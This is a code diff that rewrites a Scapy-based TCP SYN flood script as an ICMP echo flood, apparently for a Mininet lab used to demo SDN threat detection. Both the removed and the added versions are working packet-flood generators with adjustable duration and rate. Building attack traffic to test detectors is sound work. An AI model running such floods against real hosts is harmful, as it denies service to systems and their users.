@@ -1,14 +1,13 @@
 #!/usr/bin/env python3
-"""Run a TCP SYN flood from a Mininet host namespace.
+"""Run an ICMP flood from a Mininet host namespace.
 
 Example usage (from the Mininet CLI):
-    mininet> hacker python3 src/scripts/syn_flood.py -d 30 -p 200 10.0.3.10
+    mininet> hacker .venv/bin/python3 src/scripts/icmp_flood.py 10.0.3.10 -d 30 -p 200
 """
 
 from __future__ import annotations
 
 import argparse
-import random
 import time
 from ipaddress import IPv4Address
 
@@ -17,63 +16,62 @@ import scapy.all as scapy  # type: ignore[import-untyped]
 FILE_NAME = __file__.split("/")[-1]
 
 # Default flood profile for demo traffic generation.
-DEFAULT_SYN_FLOOD_DURATION = 30
-DEFAULT_SYN_FLOOD_PPS = 200
+DEFAULT_ICMP_FLOOD_DURATION = 30
+DEFAULT_ICMP_FLOOD_PPS = 200
 
 
-def syn_flood(
+def icmp_flood(
     target: IPv4Address,
     *,
-    duration: int = DEFAULT_SYN_FLOOD_DURATION,
-    pps: int = DEFAULT_SYN_FLOOD_PPS,
+    duration: int = DEFAULT_ICMP_FLOOD_DURATION,
+    pps: int = DEFAULT_ICMP_FLOOD_PPS,
 ) -> None:
-    """Send a burst of TCP SYN packets to target:80.
+    """Send a burst of ICMP echo-request packets to a target.
 
     Args:
         target: Destination IPv4 address.
         duration: How long to sustain the flood in seconds.
         pps: Packets per second.
     """
+    if duration <= 0:
+        msg = "Duration must be greater than 0"
+        raise ValueError(msg)
     if pps <= 0:
         msg = "Packets per second must be greater than 0"
         raise ValueError(msg)
 
     interval = 1.0 / pps
     end_time = time.monotonic() + duration
-    sent = 0
+    sent_packets = 0
 
     print(f"[{FILE_NAME}] target={target} {duration=}s {pps=}")
 
     while time.monotonic() < end_time:
-        pkt = scapy.IP(dst=str(target)) / scapy.TCP(
-            sport=random.randint(1024, 65535),  # noqa: S311
-            dport=80,
-            flags="S",
-        )
-        scapy.send(pkt, verbose=False)
-        sent += 1
+        packet = scapy.IP(dst=str(target)) / scapy.ICMP(type="echo-request")
+        scapy.send(packet, verbose=False)
+        sent_packets += 1
         time.sleep(interval)
 
-    print(f"[{FILE_NAME}] done - {sent} packets sent")
+    print(f"[{FILE_NAME}] done - {sent_packets} packets sent")
 
 
 def _build_parser() -> argparse.ArgumentParser:
     parser = argparse.ArgumentParser(
-        description="Generate TCP SYN flood traffic for SDN threat detection demo."
+        description="Generate ICMP flood traffic for SDN threat detection demo."
     )
     parser.add_argument("target", type=IPv4Address, help="Target IPv4 address")
     parser.add_argument(
         "-d",
         "--duration",
         type=int,
-        default=DEFAULT_SYN_FLOOD_DURATION,
+        default=DEFAULT_ICMP_FLOOD_DURATION,
         help="Flood duration in seconds (default: %(default)s)",
     )
     parser.add_argument(
         "-p",
         "--pps",
         type=int,
-        default=DEFAULT_SYN_FLOOD_PPS,
+        default=DEFAULT_ICMP_FLOOD_PPS,
         help="Packets per second (default: %(default)s)",
     )
     return parser
@@ -82,7 +80,7 @@ def _build_parser() -> argparse.ArgumentParser:
 def main() -> None:
     """Entry point for the script."""
     args = _build_parser().parse_args()
-    syn_flood(args.target, duration=args.duration, pps=args.pps)
+    icmp_flood(args.target, duration=args.duration, pps=args.pps)
 
 
 if __name__ == "__main__":
